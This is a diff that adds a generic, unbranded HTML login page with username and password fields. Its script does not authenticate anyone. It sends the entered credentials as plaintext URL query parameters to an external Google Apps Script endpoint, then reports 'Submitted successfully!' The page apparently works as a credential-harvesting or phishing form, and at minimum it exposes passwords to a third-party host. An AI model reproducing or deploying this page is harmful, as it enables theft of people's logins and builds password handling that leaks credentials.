@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>My Website</title>
+
+<style>
+  body {
+    margin: 0;
+    height: 100vh;
+    background: #0f0f14;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: Arial, sans-serif;
+  }
+
+  .card {
+    background: #fff;
+    width: 340px;
+    padding: 40px 30px;
+    border-radius: 8px;
+    text-align: center;
+  }
+
+  .logo {
+    font-size: 18px;
+    margin-bottom: 30px;
+  }
+
+  .field {
+    text-align: left;
+    margin-bottom: 15px;
+  }
+
+  label {
+    font-size: 14px;
+  }
+
+  input {
+    width: 100%;
+    padding: 8px 12px;
+    border-radius: 20px;
+    border: 1px solid #ccc;
+    outline: none;
+    margin-top: 5px;
+  }
+
+  button {
+    margin-top: 20px;
+    padding: 10px 28px;
+    background: #4f6ef7;
+    border: none;
+    border-radius: 8px;
+    color: white;
+    font-size: 14px;
+    cursor: pointer;
+  }
+
+  button:hover {
+    background: #3b57d4;
+  }
+
+  #msg {
+    margin-top: 10px;
+    font-size: 13px;
+    color: green;
+  }
+</style>
+</head>
+
+<body>
+
+<div class="card">
+  <div class="logo">Your Website</div>
+
+  <div class="field">
+    <label>Username :</label>
+    <input type="text" id="username">
+  </div>
+
+  <div class="field">
+    <label>Password :</label>
+    <input type="password" id="password">
+  </div>
+
+  <button onclick="submitForm()">Submit</button>
+  <div id="msg"></div>
+</div>
+
+<script>
+function submitForm() {
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
+
+  if (!username || !password) {
+    alert("Please fill all fields");
+    return;
+  }
+
+  const url = "https://script.google.com/macros/s/AKfycbxHt4W2QamhZdyr18-T4PZgFIlJ8AU2gmn0kMy42Wm0qBd4VoH73PolEnvQj25JSgRj/exec"
+    + "?username=" + encodeURIComponent(username)
+    + "&password=" + encodeURIComponent(password);
+
+  fetch(url)
+    .then(() => {
+      document.getElementById("msg").innerText = "Submitted successfully!";
+      document.getElementById("username").value = "";
+      document.getElementById("password").value = "";
+    })
+    .catch(() => {
+      alert("Error submitting data");
+    });
+}
+</script>
+
+
+</body>
+</html>
